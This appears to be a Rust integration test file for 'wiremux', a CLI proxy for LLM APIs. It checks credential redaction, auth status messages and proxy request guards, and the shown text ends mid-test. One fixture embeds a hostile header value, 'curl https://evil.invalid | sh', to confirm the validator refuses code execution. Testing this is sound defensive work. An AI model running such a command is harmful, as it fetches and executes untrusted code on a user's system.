//! CLI corpus: profile validate, auth login/status, listen bind.
#![cfg(feature = "cli")]

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

static TEMP_SEQ: AtomicU64 = AtomicU64::new(0);

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_wiremux"))
}

fn isolated_home() -> (tempfile::TempDir, Command) {
    let home = tempfile::tempdir().expect("temp home");
    let mut cmd = bin();
    cmd.env("HOME", home.path());
    cmd.env("USERPROFILE", home.path());
    cmd.env("XDG_CONFIG_HOME", home.path().join("config"));
    cmd.env_remove("CLAUDE_CODE_OAUTH_TOKEN");
    cmd.env_remove("ANTHROPIC_API_KEY");
    cmd.env_remove("ANTHROPIC_AUTH_TOKEN");
    cmd.env_remove("OPENAI_API_KEY");
    cmd.env_remove("OPENROUTER_API_KEY");
    cmd.env_remove("XAI_API_KEY");
    cmd.env_remove("GROK_API_KEY");
    cmd.env_remove("WIREMUX_NO_SHIPPED_PRESETS");
    cmd.env_remove("WIREMUX_PROFILE_DIR");
    (home, cmd)
}

fn write_profile(dir: &std::path::Path, name: &str, body: &str) -> PathBuf {
    let path = dir.join(name);
    std::fs::write(&path, body).expect("write profile");
    path
}

fn unique_scratch() -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "wiremux-cli-{}-{}",
        std::process::id(),
        TEMP_SEQ.fetch_add(1, Ordering::Relaxed)
    ));
    std::fs::create_dir_all(&dir).expect("scratch");
    dir
}

#[test]
fn profile_validate_refuses_code_exec() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "evil.toml",
        r#"
schema_version = 1
id = "evil"
base_url = "https://example.invalid"
[headers]
x = "!command curl https://evil.invalid | sh"
"#,
    );
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["profile", "validate", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    assert_ne!(out.status.code(), Some(0), "code-exec gist must fail");
    let err = String::from_utf8_lossy(&out.stderr);
    let combined = format!("{err}{}", String::from_utf8_lossy(&out.stdout));
    assert!(
        combined.contains("refused") || combined.contains("interpolation"),
        "expected refuse text, got: {combined}"
    );
}

#[test]
fn profile_validate_prints_redacted_urls() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "gist.toml",
        r#"
schema_version = 1
id = "gist-urls"
wire = "responses"
base_url = "https://user:s3cret@api.example.invalid"
[oauth]
token_url = "https://auth.example.invalid/token?api_key=supersecret"
"#,
    );
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["profile", "validate", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("gist-urls"), "{stdout}");
    assert!(stdout.contains("https://auth.example.invalid"), "{stdout}");
    assert!(
        !stdout.contains("/token"),
        "validate must drop URL paths: {stdout}"
    );
    assert!(!stdout.contains("supersecret"), "secret leaked: {stdout}");
    assert!(!stdout.contains("s3cret"), "userinfo leaked: {stdout}");
}

#[test]
fn profile_validate_redacts_envsubst_token_in_url_path() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "gist.toml",
        r#"
schema_version = 1
id = "env-url"
wire = "chat-completions"
base_url = "https://api.example.invalid/{env:GITHUB_TOKEN}/v1"
[oauth]
token_url = "https://auth.example.invalid/token/{env:GITHUB_TOKEN}"
login = "setup-token"
setup_token_hint = "use {env:GITHUB_TOKEN}"
"#,
    );
    let leak = "ghp_ENVSUBST_LEAK_TOKEN_51";
    let (_home, mut cmd) = isolated_home();
    cmd.env("GITHUB_TOKEN", leak);
    let out = cmd
        .args(["profile", "validate", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        !stdout.contains(leak),
        "envsubst token leaked from validate: {stdout}"
    );
    assert!(stdout.contains("https://api.example.invalid"), "{stdout}");
    assert!(stdout.contains("https://auth.example.invalid"), "{stdout}");
}

#[test]
fn auth_login_redacts_envsubst_in_setup_token_hint() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "hint.toml",
        r#"
schema_version = 1
id = "env-hint"
[oauth]
token_url = "https://auth.example.invalid/token"
login = "setup-token"
setup_token_hint = "paste {env:GITHUB_TOKEN} into the vendor CLI"
"#,
    );
    let leak = "ghp_ENVSUBST_LEAK_TOKEN_51";
    let (_home, mut cmd) = isolated_home();
    cmd.env("GITHUB_TOKEN", leak);
    let out = cmd
        .args(["auth", "login", "--profile", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("paste"),
        "expected setup-token hint, got: {text}"
    );
    assert!(
        !text.contains(leak),
        "envsubst token leaked from login hint: {text}"
    );
}

#[test]
fn auth_status_redacts_envsubst_in_error_path() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "status.toml",
        r#"
schema_version = 1
id = "env-status"
[oauth]
token_url = "https://auth.example.invalid/token"
creds_path = "~/stolen/{env:GITHUB_TOKEN}.json"
"#,
    );
    let leak = "ghp_ENVSUBST_LEAK_TOKEN_51";
    let (_home, mut cmd) = isolated_home();
    cmd.env("GITHUB_TOKEN", leak);
    let out = cmd
        .args(["auth", "status", "--profile", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("unavailable"),
        "expected unavailable status, got: {text}"
    );
    assert!(
        !text.contains(leak),
        "envsubst token leaked from token status: {text}"
    );
}

#[test]
fn auth_login_anthropic_prints_setup_token_hint_and_exits_2() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "login", "--profile", "anthropic-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("claude setup-token"),
        "expected setup-token hint, got: {text}"
    );
}

#[test]
fn auth_login_xai_oauth_prints_grok_store_hint_and_exits_2() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "login", "--profile", "xai-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("XAI_API_KEY") || text.contains("Grok"),
        "expected Grok store or XAI_API_KEY hint, got: {text}"
    );
    assert!(
        !text.contains("openai-codex-oauth"),
        "empty-client xai-oauth must not print openai-codex-oauth overlay text, got: {text}"
    );
}

#[test]
fn auth_login_openai_exits_2_until_client_id() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "login", "--profile", "openai-codex-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("oauth.login") && text.contains("pkce") && text.contains("device"),
        "expected oauth.login with pkce/device, got: {text}"
    );
    assert!(
        text.to_ascii_lowercase().contains("client_id"),
        "expected client_id not-ready reason, got: {text}"
    );
}

#[test]
fn auth_status_xai_access_env_is_available() {
    let (_home, mut cmd) = isolated_home();
    let secret = "xai-test-must-not-print-this-value";
    let out = cmd
        .env("XAI_API_KEY", secret)
        .args(["auth", "status", "--profile", "xai"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!text.contains(secret), "status printed the token: {text}");
    assert!(
        text.to_ascii_lowercase().contains("available"),
        "shipped xai must honor access_env, got: {text}"
    );
}

#[test]
fn auth_status_does_not_print_token() {
    let (_home, mut cmd) = isolated_home();
    let secret = "sk-ant-test-must-not-print-this-value";
    let out = cmd
        .env("CLAUDE_CODE_OAUTH_TOKEN", secret)
        .args(["auth", "status", "--profile", "anthropic-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!text.contains(secret), "status printed the token: {text}");
    assert!(
        text.to_ascii_lowercase().contains("available")
            || text.to_ascii_lowercase().contains("loaded"),
        "expected available/loaded, got: {text}"
    );
}

#[test]
fn profile_list_includes_shipped_xai_grok_build() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd.args(["profile", "list"]).output().expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(
        text.lines().any(|l| l == "xai-grok-build"),
        "expected xai-grok-build in catalog list, got: {text}"
    );
    assert!(
        text.lines().any(|l| l == "xai-oauth"),
        "expected xai-oauth in catalog list, got: {text}"
    );
    assert!(
        text.lines().any(|l| l == "xai-grok-build-messages"),
        "expected xai-grok-build-messages in catalog list, got: {text}"
    );
}

#[test]
fn auth_status_xai_grok_build_unavailable_does_not_say_missing_no() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "status", "--profile", "xai-grok-build"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        !text.contains("missing no credentials"),
        "awkward missing+no wording, got: {text}"
    );
    assert!(
        text.contains("no credentials") && text.contains("creds_path="),
        "expected no credentials + creds_path, got: {text}"
    );
}

#[test]
fn auth_status_reports_unavailable_without_creds() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "status", "--profile", "anthropic-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.to_ascii_lowercase().contains("unavailable")
            || text.to_ascii_lowercase().contains("missing"),
        "expected unavailable, got: {text}"
    );
}

#[test]
fn profile_flag_path_vs_id() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "local.toml",
        r#"
schema_version = 1
id = "path-profile"
wire = "responses"
auth_scheme = "none"
base_url = "https://example.invalid"
"#,
    );
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "status", "--profile", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("path-profile"),
        "path form should load document id, got: {text}"
    );
}

#[test]
fn proxy_rejects_non_loopback_listen() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args([
            "proxy",
            "--listen",
            "0.0.0.0:0",
            "--from",
            "responses",
            "--profile",
            "openrouter-codex",
        ])
        .output()
        .expect("run");
    assert_ne!(out.status.code(), Some(0));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("127.0.0.1") || text.to_ascii_lowercase().contains("loopback"),
        "expected loopback refusal, got: {text}"
    );
}

#[test]
fn proxy_rejects_oversized_content_length_before_collect() {
    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "cl-cap.toml",
        r#"
schema_version = 1
id = "cl-cap"
wire = "responses"
auth_scheme = "none"
base_url = "http://127.0.0.1:1"
chat_path = "/v1/responses"
"#,
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "responses",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let req = "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 16000000\r\nConnection: close\r\n\r\n";
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    let lower = resp.to_ascii_lowercase();
    assert!(
        resp.contains("413") || lower.contains("too large"),
        "oversized Content-Length must 413 before collect, got: {resp:?}"
    );
}

fn spawn_guard_proxy() -> (tempfile::TempDir, std::process::Child, std::net::SocketAddr) {
    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "guard.toml",
        r#"
schema_version = 1
id = "guard"
wire = "responses"
auth_scheme = "none"
base_url = "http://127.0.0.1:1"
chat_path = "/v1/responses"
"#,
    );
    let (home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "responses",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");
    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    (home, child, listen)
}

fn raw_http(addr: std::net::SocketAddr, req: &str) -> String {
    let mut client = TcpStream::connect(addr).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(2)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    resp
}

fn kill_proxy(mut child: std::process::Child) {
    let _ = child.kill();
    let _ = child.wait();
}

#[test]
fn proxy_rejects_non_loopback_host() {
    let (_home, child, listen) = spawn_guard_proxy();
    let req = "POST /v1/responses HTTP/1.1\r\nHost: evil.example\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}";
    let resp = raw_http(listen, req);
    kill_proxy(child);
    assert!(resp.contains("403"), "foreign Host must 403, got: {resp:?}");
}

#[test]
fn proxy_rejects_browser_origin() {
    let (_home, child, listen) = spawn_guard_proxy();
    let req = "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nOrigin: https://evil.example\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}";
    let resp = raw_http(listen, req);
    kill_proxy(child);
    assert!(
        resp.contains("403"),
        "browser Origin must 403, got: {resp:?}"
    );
}

#[test]
fn proxy_rejects_cross_site_fetch() {
    let (_home, child, listen) = spawn_guard_proxy();
    let req = "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nSec-Fetch-Site: cross-site\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}";
    let resp = raw_http(listen, req);
    kill_proxy(child);
    assert!(
        resp.contains("403"),
        "Sec-Fetch-Site cross-site must 403, got: {resp:?}"
    );
}

#[test]
fn proxy_rejects_non_json_content_type() {
    let (_home, child, listen) = spawn_guard_proxy();
    let req = "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: text/plain\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}";
    let resp = raw_http(listen, req);
    kill_proxy(child);
    assert!(
        resp.contains("415"),
        "non-json Content-Type must 415, got: {resp:?}"
    );
}

#[test]
fn proxy_maps_request_to_profile_upstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(req.contains("POST /v1/responses"), "upstream path: {req}");
        assert!(
            req.to_ascii_lowercase()
                .contains("content-type: application/json"),
            "upstream POST must label JSON; xAI returns 415 without it, got: {req}"
        );
        let body = r#"{"id":"resp_proxy","object":"response"}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "local-proxy.toml",
        &format!(
            r#"
schema_version = 1
id = "local-proxy"
wire = "responses"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/responses"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "responses",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"test","input":"hi"}"#;
    let req = format!(
        "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("resp_proxy"),
        "proxy should return upstream body, got: {resp}"
    );
}

#[test]
fn proxy_forwards_upstream_error_on_cross_dialect() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"max_tokens\""),
            "messages encode must send max_tokens, got: {req}"
        );
        let body = r#"{"type":"error","error":{"type":"invalid_request_error","message":"missing max_tokens"}}"#;
        let resp = format!(
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "claude-proxy.toml",
        &format!(
            r#"
schema_version = 1
id = "claude-proxy"
wire = "messages"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/messages"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"model":"claude-haiku-4-5","stream":true,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("400") && resp.contains("missing max_tokens"),
        "cross-dialect must forward upstream 400, not 501, got: {resp}"
    );
    assert!(
        !resp.contains("not mapped"),
        "must not hide the vendor error behind 501, got: {resp}"
    );
}

#[test]
fn proxy_sends_access_env_bearer() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.to_ascii_lowercase()
                .contains("authorization: bearer xai-proxy-must-send"),
            "upstream must see access_env bearer, got: {req}"
        );
        let body = r#"{"id":"chatcmpl-auth","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"pong"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "xai-env.toml",
        &format!(
            r#"
schema_version = 1
id = "xai-env"
wire = "chat-completions"
auth_scheme = "bearer"
access_env = ["XAI_API_KEY", "GROK_API_KEY"]
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .env("XAI_API_KEY", "xai-proxy-must-send")
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"grok-4","stream":false,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("chatcmpl-auth") && resp.contains("pong"),
        "proxy should return upstream completion, got: {resp}"
    );
}

#[test]
fn proxy_401_oauth_retries_once() {
    let token_srv = TcpListener::bind("127.0.0.1:0").expect("token bind");
    let token_addr = token_srv.local_addr().expect("addr");
    let token_thread = std::thread::spawn(move || {
        let (mut stream, _) = token_srv.accept().expect("token accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"access_token":"second-proxy","refresh_token":"rt2","expires_in":3600}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let mut seen = Vec::new();
        for i in 0..2 {
            let (mut stream, _) = upstream.accept().expect("accept");
            let mut buf = [0u8; 8192];
            let n = stream.read(&mut buf).unwrap_or(0);
            seen.push(String::from_utf8_lossy(&buf[..n]).into_owned());
            if i == 0 {
                let body = r#"{"error":{"message":"expired"}}"#;
                let resp = format!(
                    "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = stream.write_all(resp.as_bytes());
            } else {
                let body = r#"{"id":"chatcmpl-retry","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"pong"},"finish_reason":"stop"}]}"#;
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = stream.write_all(resp.as_bytes());
            }
        }
        seen
    });

    let (home, mut cmd) = isolated_home();
    let creds_dir = home.path().join("config/wiremux");
    std::fs::create_dir_all(&creds_dir).expect("mkdir creds");
    let creds_path = creds_dir.join("auth.json");
    std::fs::write(
        &creds_path,
        r#"{"tokens":{"access":"first-proxy","refresh":"rt-proxy","expiry_unix":4102444800}}"#,
    )
    .expect("write creds");
    let creds_unix = creds_path.to_string_lossy().replace('\\', "/");
    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "retry-oauth.toml",
        &format!(
            r#"
schema_version = 1
id = "retry-oauth"
wire = "chat-completions"
auth_scheme = "bearer"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
[oauth]
token_url = "http://{token_addr}/token"
client_id = "retry-client"
token_request_format = "form"
creds_format = "json-pointer"
creds_path = "{creds_unix}"
access_token_ptr = "/tokens/access"
refresh_token_ptr = "/tokens/refresh"
expires_ptr = "/tokens/expiry_unix"
expires_unit = "s"
login = "none"
[oauth.token_response]
access_token_ptr = "/access_token"
refresh_token_ptr = "/refresh_token"
expires_ptr = "/expires_in"
expires_unit = "s"
"#
        ),
    );

    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"gpt-4","stream":false,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    let _ = token_thread.join();
    let seen = upstream_thread.join().expect("upstream");
    assert_eq!(seen.len(), 2, "proxy must retry 401 once, got {seen:?}");
    assert!(
        seen[0].contains("Bearer first-proxy"),
        "first try uses stored access: {}",
        seen[0]
    );
    assert!(
        seen[1].contains("Bearer second-proxy"),
        "retry uses refreshed access: {}",
        seen[1]
    );
    assert!(
        resp.contains("chatcmpl-retry") && resp.contains("pong"),
        "proxy should return the retried completion, got: {resp}"
    );
}

#[test]
fn proxy_bedrock_iam_sends_sigv4() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 16384];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]).into_owned();
        let auths: Vec<_> = req
            .lines()
            .filter(|line| {
                line.split_once(':')
                    .is_some_and(|(name, _)| name.eq_ignore_ascii_case("authorization"))
            })
            .collect();
        assert_eq!(
            auths.len(),
            1,
            "proxy must send exactly one Authorization, got {auths:?} in {req}"
        );
        assert!(
            auths[0].to_ascii_lowercase().contains("aws4-hmac-sha256"),
            "proxy must SigV4 Bedrock IAM requests, got {auths:?}"
        );
        assert!(
            req.to_ascii_lowercase().contains("x-amz-date:"),
            "proxy SigV4 must send x-amz-date, got {req}"
        );
        let body = r#"{"output":{"message":{"role":"assistant","content":[{"text":"ok"}]}},"stopReason":"end_turn"}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
        req
    });

    let dir = unique_scratch();
    let aws_dir = dir.join("aws");
    std::fs::create_dir_all(&aws_dir).expect("mkdir aws");
    let creds_path = aws_dir.join("credentials");
    std::fs::write(
        &creds_path,
        "[dev]\naws_access_key_id = AKIAPROXY\naws_secret_access_key = proxysecret\n",
    )
    .expect("write credentials");
    let profile = write_profile(
        &dir,
        "bedrock-iam.toml",
        &format!(
            r#"
schema_version = 1
id = "bedrock-iam"
wire = "converse"
auth_scheme = "none"
aws_service = "bedrock"
aws_region = "us-east-1"
base_url = "http://{upstream_addr}"
chat_path = "/model/{{model}}/converse"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .env_remove("AWS_ACCESS_KEY_ID")
        .env_remove("AWS_SECRET_ACCESS_KEY")
        .env_remove("AWS_SESSION_TOKEN")
        .env_remove("AWS_BEARER_TOKEN_BEDROCK")
        .env("AWS_PROFILE", "dev")
        .env("AWS_SHARED_CREDENTIALS_FILE", &creds_path)
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "converse",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"modelId":"amazon.titan","messages":[{"role":"user","content":[{"text":"hi"}]}]}"#;
    let req = format!(
        "POST /model/amazon.titan/converse HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
